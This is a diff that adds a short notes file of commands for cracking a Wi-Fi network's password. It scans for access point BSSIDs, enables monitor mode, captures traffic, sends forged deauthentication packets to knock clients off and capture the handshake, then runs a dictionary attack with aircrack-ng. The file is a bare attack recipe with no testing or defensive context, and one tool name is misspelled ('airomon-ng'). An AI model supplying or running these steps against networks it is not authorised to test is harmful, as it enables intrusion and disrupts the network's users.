@@ -1,0 +1,10 @@
+#To get BSSID:
+iwlist wlan0 scanning  |grep -B 5 ESSI
+
+#Sending fake deauth packet and capturing data
+airomon-ng start wlan0
+airodump-ng --channel 1 --bssid <insertBSSID> -w /bigfiles/capture-dmp mon0
+aireplay-ng -a <insertBSSID> --deauth 5 mon0
+
+#Cracking stuff
+aircrack-ng -w <pathToDictionaryFile> /bigfiles/capture-dmp-01.cap
